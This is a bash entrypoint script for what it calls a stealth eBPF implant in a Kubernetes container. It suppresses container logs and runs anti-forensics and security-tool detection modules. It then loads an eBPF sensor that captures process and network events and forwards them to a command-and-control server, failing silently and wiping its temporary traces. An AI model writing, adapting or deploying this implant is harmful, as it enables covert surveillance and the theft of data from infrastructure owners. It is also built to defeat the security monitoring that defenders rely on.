#!/bin/bash
# eBPF Implant - Kubernetes Container Entrypoint
# Stealth & OPSEC hardened startup sequence

set -e

# Redirect all output to /dev/null (suppress container logs)
exec 1>/dev/null 2>&1

IMPLANT_DIR="/opt/implant"
CONFIG_FILE="${IMPLANT_DIR}/config.json"
BPF_PROGRAM="${IMPLANT_DIR}/sensor.o"
LOG_FILE="/dev/shm/.telemetry.log"

# Export Python path
export PYTHONPATH="${IMPLANT_DIR}/src:${PYTHONPATH}"

# =============================================================================
# 1. Initialize Stealth Features
# =============================================================================

# Import anti-forensics module
python3 << 'PYTHON_INIT'
import sys
sys.path.insert(0, '/opt/implant/src')

from anti_forensics import StealthyImplantBootstrap

try:
    bootstrap = StealthyImplantBootstrap()
    status = bootstrap.initialize()
    
    # Log status to shared memory (only visible to us)
    with open('/dev/shm/.implant-status', 'w') as f:
        import json
        json.dump(status, f)
except Exception as e:
    # Silently fail - don't reveal bootstrap errors
    pass
PYTHON_INIT

# =============================================================================
# 2. Detect Security Tools & Adapt Strategy
# =============================================================================

python3 << 'PYTHON_DETECT'
import sys
import json
sys.path.insert(0, '/opt/implant/src')

from anti_forensics import DetectionEvader

detected = DetectionEvader.get_detected_tools()
strategy = DetectionEvader.adapt_collection_strategy(detected)

# Save strategy for implant agent
with open('/dev/shm/.collection-strategy', 'w') as f:
    json.dump(strategy, f)
PYTHON_DETECT

# =============================================================================
# 3. Load eBPF Program
# =============================================================================

# Check kernel version (must be >= 5.8)
KERNEL_VERSION=$(uname -r | cut -d. -f1,2)
MAJOR=$(echo $KERNEL_VERSION | cut -d. -f1)
MINOR=$(echo $KERNEL_VERSION | cut -d. -f2)

if [ $MAJOR -lt 5 ] || ([ $MAJOR -eq 5 ] && [ $MINOR -lt 8 ]); then
    # Kernel too old, exit gracefully without error
    exit 0
fi

# Check if BPF filesystem is mounted
if ! grep -q bpffs /proc/mounts; then
    mkdir -p /sys/fs/bpf
    mount -t bpf bpf /sys/fs/bpf || true
fi

# Check if debugfs is mounted
if ! grep -q debugfs /proc/mounts; then
    mkdir -p /sys/kernel/debug
    mount -t debugfs debugfs /sys/kernel/debug || true
fi

# =============================================================================
# 4. Start eBPF Implant Agent
# =============================================================================

# Read collection strategy
if [ -f /dev/shm/.collection-strategy ]; then
    STRATEGY=$(cat /dev/shm/.collection-strategy)
else
    STRATEGY="{}"
fi

# Start implant agent with adaptive parameters
python3 << PYTHON_AGENT
import sys
import os
import json
import signal
sys.path.insert(0, '/opt/implant/src')

# Minimize memory footprint
import gc
gc.set_debug(0)

try:
    from implant_agent import EBPFImplantAgent
    from c2_client import C2ClientOrchestrator, C2Configuration
    from cryptography.fernet import Fernet
    
    # Load configuration
    with open('${CONFIG_FILE}', 'r') as f:
        config = json.load(f)
    
    # Load collection strategy
    try:
        with open('/dev/shm/.collection-strategy', 'r') as f:
            strategy = json.load(f)
            # Apply strategy to config
            config['collection']['process_events']['sampling_rate'] = strategy['sampling_rate']
            config['collection']['network_events']['sampling_rate'] = strategy['sampling_rate']
    except:
        pass
    
    # Initialize implant agent
    agent = EBPFImplantAgent('${BPF_PROGRAM}', '${CONFIG_FILE}')
    
    # Load and start collection
    if agent.load_bpf():
        agent.start_collection()
        
        # Initialize C2 client
        try:
            c2_config = C2Configuration(
                server_url=os.environ.get('C2_SERVER', 'https://localhost:8000'),
                cert_sha256=os.environ.get('C2_CERT_SHA256', ''),
                api_key=os.environ.get('C2_API_KEY', ''),
                encryption_key=os.environ.get('ENCRYPTION_KEY', Fernet.generate_key().decode()),
            )
            
            c2 = C2ClientOrchestrator(c2_config)
            c2.start()
            
            # Forward events to C2
            while True:
                events = agent.get_events()
                for event in events:
                    c2.queue_telemetry(event)
                
                # Periodic export to disk
                if agent.should_export():
                    agent.export_telemetry()
        
        except Exception as e:
            # C2 error - continue collecting locally
            while True:
                events = agent.get_events()
                if agent.should_export():
                    agent.export_telemetry()

except Exception as e:
    # Silent failure
    pass

PYTHON_AGENT

# =============================================================================
# 5. Graceful Shutdown Handler
# =============================================================================

trap 'cleanup' SIGTERM SIGINT

cleanup() {
    # Clean up temporary files
    rm -f /dev/shm/.implant-status
    rm -f /dev/shm/.collection-strategy
    rm -f /dev/shm/telemetry-*
    
    # Unload eBPF programs (optional - avoids detection)
    # bpftool prog list | grep -i ebpf | awk '{print $1}' | xargs -I{} bpftool prog del id {}
    
    # Exit
    exit 0
}

# Keep container running
while true; do
    sleep 3600
done

